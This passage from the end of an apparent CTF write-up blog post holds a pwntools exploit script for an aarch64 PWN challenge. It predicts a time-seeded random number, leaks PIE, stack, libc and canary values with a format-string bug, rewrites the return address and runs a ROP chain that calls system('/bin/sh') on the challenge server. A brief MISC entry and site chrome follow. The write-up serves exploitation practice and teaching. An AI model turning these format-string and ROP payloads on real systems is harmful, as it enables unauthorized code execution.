</span></span><span class="line"><span class="cl">	<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>							<span class="c1"># remote</span>
</span></span><span class="line"><span class="cl">	<span class="n">leak_offset</span> <span class="o">=</span> <span class="mh">0x273fc</span>				<span class="c1"># REMOTE</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;152.69.210.130&#39;</span>  <span class="c1"># change your ip and port here</span>
</span></span><span class="line"><span class="cl">	<span class="c1"># ip = &#39;0.0.0.0&#39;</span>
</span></span><span class="line"><span class="cl">	<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
</span></span><span class="line"><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>    
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/usr/lib/aarch64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span> 	<span class="c1"># local</span>
</span></span><span class="line"><span class="cl">	<span class="n">leak_offset</span> <span class="o">=</span> <span class="mh">0x273fc</span>				<span class="c1"># LOCAL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./qemu_aarch64&#39;</span><span class="p">,</span> <span class="n">exe</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">	<span class="c1"># r = process([&#39;./ld-linux-aarch64.so.1&#39;, &#39;--library-path&#39;, &#39;.&#39;, exe])</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./qemu_aarch64&#39;</span><span class="p">,</span> <span class="s1">&#39;-g&#39;</span><span class="p">,</span> <span class="s1">&#39;9999&#39;</span><span class="p">,</span> <span class="n">exe</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">	<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/usr/lib/aarch64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span> 	<span class="c1"># local</span>
</span></span><span class="line"><span class="cl">	<span class="n">leak_offset</span> <span class="o">=</span> <span class="mh">0x273fc</span>				<span class="c1"># LOCAL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1"># subprocess.Popen([&#39;gnome-terminal&#39;, &#39;--&#39;, &#39;gdb-multiarch&#39;, &#39;-q&#39;, exe])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">	target remote :9999
</span></span></span><span class="line"><span class="cl"><span class="s1">	b __libc_start_main@plt
</span></span></span><span class="line"><span class="cl"><span class="s1">	c
</span></span></span><span class="line"><span class="cl"><span class="s1">	b *($x0-0x24c)
</span></span></span><span class="line"><span class="cl"><span class="s1">	b *($x0-0x328)
</span></span></span><span class="line"><span class="cl"><span class="s1">	b *($x0-0x318)
</span></span></span><span class="line"><span class="cl"><span class="s1">	&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ================== vuln1 ===================== #</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter your guess: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_vuln1</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">CDLL</span><span class="p">(</span><span class="n">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_vuln1</span><span class="o">.</span><span class="n">srand</span><span class="p">(</span><span class="ne">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Generate a magic number</span>
</span></span><span class="line"><span class="cl"><span class="n">magic_number</span> <span class="o">=</span> <span class="n">libc_vuln1</span><span class="o">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10000</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">magic_number</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ================== vuln2 ===================== #</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;your spell: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%4$p.%8$p.%29$p.%21$p&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># leak_payload = b&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># for i in range(18, 28):</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 	leak_payload += f&#39;%{i}$p.&#39;.encode()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">leak_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pie</span> <span class="o">=</span> <span class="ne">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10b1</span> 
</span></span><span class="line"><span class="cl"><span class="n">stack</span> <span class="o">=</span> <span class="ne">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x8</span>		<span class="c1"># return address of vuln1 (main+ gif dos)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="ne">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">leak_offset</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="ne">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="ne">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;Get PIE: {hex(pie)}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;Get STACK: {hex(stack)}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;Get LIBC: {hex(libc_base)}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;Get CANARY: {hex(canary)}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">input</span><span class="p">(</span><span class="s2">&#34;Press Enter to continue...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">vuln3_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">pie</span><span class="o">+</span><span class="mh">0xbd4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl"><span class="n">vuln3_read_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">pie</span><span class="o">+</span><span class="mh">0xc24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl"><span class="n">vuln2_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">pie</span><span class="o">+</span><span class="mh">0xc64</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main_ret_addr</span> <span class="o">=</span> <span class="n">pie</span><span class="o">+</span><span class="mh">0xf64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;your spell: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s1">&#39;AA%.{vuln2_offset-2}d%14$hn&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;We will return to this address: {hex(main_ret_addr)}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s1">&#39;%{main_ret_addr &amp; 0xFFFF}c%14$hn&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;your spell: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s1">&#39;%{(main_ret_addr&gt;&gt;16) &amp; 0xFFFF}c%14$hn&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mh">0x32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;your spell: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s1">&#39;%14$hn&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mh">0x34</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># payload = b&#39;%p&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;your spell: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s1">&#39;%{vuln3_read_offset &amp; 0xFFFF}c%14$hn&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x40</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;your spell: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== vuln3 ======================== #</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">first_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">second_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># r.recvuntil(b&#39;Give me your name: &#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="mi">128</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span>		<span class="c1"># pad</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">first_gadget</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">second_gadget</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">__next__</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p><img src="https://hackmd.io/_uploads/B1QGl6ogyg.png" alt="image"></p>
<h2 id="misc">
<a class="header-anchor" href="#misc"></a>
MISC
</h2><h3 id="welcome">
<a class="header-anchor" href="#welcome"></a>
Welcome
</h3><p><img src="https://hackmd.io/_uploads/ryTnC9ieke.png" alt="image"></p>
<p>It&rsquo;s a damn adorable challenge! I love itttttttttttttttttt &lt;3</p>

      
    </div>
    <footer class="article-footer">
      
        






<blockquote class="article-copyright">
  
    <p><strong><span class="icon-user icon"></span>Author: </strong>Spid3r @ Adventures of Spid3r</p>
  
  
  
  
    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2024-10-27 11:00:00</p>
  
  
  
    <p>
      <strong><span class="icon-copyright icon"></span>License: </strong>
      All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener external nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!
    </p>
    <span class="icon-creative-commons article-copyright-bg"></span>
  
</blockquote>

      

      
        <div class="sponsor-wrapper">
  <div class="sponsor-button-wrapper">
    <div class="sponsor-icon rotate"></div>
    <div class="sponsor-title">Sponsor</div>
    <div class="sponsor-icon rotate"></div>
  </div>
  <div class="sponsor-tip">Buy the author a coffee!</div>
  
    <div class="sponsor-qr">
      
        <div class="sponsor-qr-image-wrapper">
          <img src="/images/bmc_qr.png" alt="buymeacoffee.com/spid3r" width="200" />
          <p class="sponsor-qr-name">buymeacoffee.com/spid3r</p>
        </div>
      
    </div>
  
</div>
      

      

      

      

      

      

      
      <ul class="article-tag-list" itemprop="keywords">
  
</ul>

    </footer>
  </div>
  
    
  <nav
    id="article-nav"
    data-aos="fade-up"
  >
    
      <div class="article-nav-link-wrap article-nav-link-left">
        
          <img
            data-src="/images/ctsv_2023/featured.png"
            data-sizes="auto"
            alt="CSTV - CAPTURE THE FLAG 2023 | Digital Forensics"
            class="lazyload"
          />
        
        <a href="https://sondt1337.github.io/post/ctsv_2023/"></a>
        <div class="article-nav-caption">Newer</div>
        <h3 class="article-nav-title">
          
            CSTV - CAPTURE THE FLAG 2023 | Digital Forensics
          
        </h3>
      </div>
    

    
  </nav>


  
</article>










</section>
        </div>
        
        
        



  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  



<footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
      <div style="flex-direction:column;align-items: center;"><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"></a>
    
    <div>
      <span class="icon-copyright"></span>
      2021 -
      2025
      <span class="footer-info-sep rotate"></span>
      Spid3r
    </div>
    
      <div>
        <span class="icon-brush"
          >&nbsp;
            19.8k
          </span
        >
        &nbsp;|&nbsp;
        <span class="icon-coffee">&nbsp;
          
          

          01:40
        </span>
      </div>
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv"
          >Number of visits&nbsp;<span
            id="busuanzi_value_site_pv"
          ></span
        ></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv"
          >Number of visitors&nbsp;<span
            id="busuanzi_value_site_uv"
          ></span
        ></span>
      </div>
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      
        <div class="sidebar-toc-sidebar">
          <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#another-one">Another one</a></li>
        <li><a href="#x-éc-éc">X Éc Éc</a></li>
        <li><a href="#s1mple">S1mple</a></li>
        <li><a href="#hihi">hihi</a></li>
        <li><a href="#niceray">niceray</a></li>
      </ul>
    </li>
    <li><a href="#osint">Osint</a>
      <ul>
        <li><a href="#sparks">Sparks</a></li>
        <li><a href="#home-sweet-home">Home sweet home</a></li>
      </ul>
    </li>
    <li><a href="#reverse-engineering">Reverse Engineering</a>
      <ul>
        <li><a href="#re01">re01</a></li>
        <li><a href="#animal">animal</a></li>
        <li><a href="#re02">re02</a></li>
        <li><a href="#the-chamber-of-flag">The Chamber of Flag</a></li>
      </ul>
    </li>
    <li><a href="#cryptography">Cryptography</a>
      <ul>
        <li><a href="#sharemixer1">ShareMixer1</a></li>
        <li><a href="#sharemixer2">ShareMixer2</a></li>
      </ul>
    </li>
    <li><a href="#forensics">Forensics</a>
      <ul>
        <li><a href="#cpusage">CPUsage</a></li>
        <li><a href="#corrupted-hard-drive">Corrupted Hard Drive</a></li>
        <li><a href="#initial">Initial</a></li>
      </ul>
    </li>
    <li><a href="#pwn">PWN</a>
      <ul>
        <li><a href="#shellcode-1">shellcode 1</a></li>
        <li><a href="#shellcode-2">shellcode 2</a></li>
        <li><a href="#game-of-luck">Game of Luck</a></li>
        <li><a href="#no_name">no_name</a></li>
      </ul>
    </li>
    <li><a href="#misc">MISC</a>
      <ul>
        <li><a href="#welcome">Welcome</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
        </div>
        <div class="sidebar-common-sidebar hidden">
          
<div class="sidebar-author">
  <img
    data-src="/avatar/../images/avatar.jpg"
    data-sizes="auto"
    alt="Spid3r"
    class="lazyload"
  />
  <div class="sidebar-author-name">Spid3r</div>
  <div class="sidebar-description">I&#39;m a little spider</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">11</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      0
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">5</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe604;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe628;
        
      </div>
      <div class="sidebar-menu-link">About</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/achievements"
        aria-label="Achievements"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe621;
        
      </div>
      <div class="sidebar-menu-link">Achievements</div>
    </div>
  
</div>

        </div>
      
    
  </div>
  
    
      <div class="sidebar-btn-wrapper">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div>
    
  
</nav>

    </div>
    
      <div class="site-search">
        <div class="reimu-popup popup">
          <div class="reimu-search">
            <div class="reimu-search-input-icon"></div>
            <div class="reimu-search-input" id="reimu-search-input"></div>
            <div class="popup-btn-close"></div>
          </div>
          <div class="reimu-results">
            <div id="reimu-stats"></div>
            <div id="reimu-hits"></div>
            <div id="reimu-pagination" class="reimu-pagination"></div>
          </div>
          <img class="reimu-bg" src="/images/reimu.png" />
        </div>
      </div>
    
    






  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
    
    
    
    
    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"
  ></script>




  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
    
    
    
    
    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"
  ></script>









  
      
      <script src="/js/main.js" integrity="" crossorigin="anonymous" ></script>
      



  





  
      
      <script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script>
      

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aosInit);
    } else {
      aosInit();
    }
  </script>








  
      
      <script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script>
      



  <script>
    var ALGOLIA_CONFIG = {
      logo: '\/images\/algolia_logo.svg',
      algolia: {
        applicationID: "",
        apiKey: "",
        indexName: "",
        hits: {
          "per_page": parseInt("10")
        },
        labels: {
          "input_placeholder": "搜索.....",
          "hits_empty": "未发现与 「${query}」相关内容",
          "hits_stats": "找到${hits}条结果（用时 ${time} ms）"
        }
      }
    };
  </script>
  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
    defer
    
    
    
    integrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"
  ></script>


  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"
    defer
    
    
    
    integrity="sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y&#43;KHTORelMMEn7mOp2AVPp&#43;7fr03dLgZiV3J" crossorigin="anonymous"
  ></script>


  





  
      
      <script src="/js/algolia_search.js" integrity="" crossorigin="anonymous" ></script>
      




  

  
  
  
  
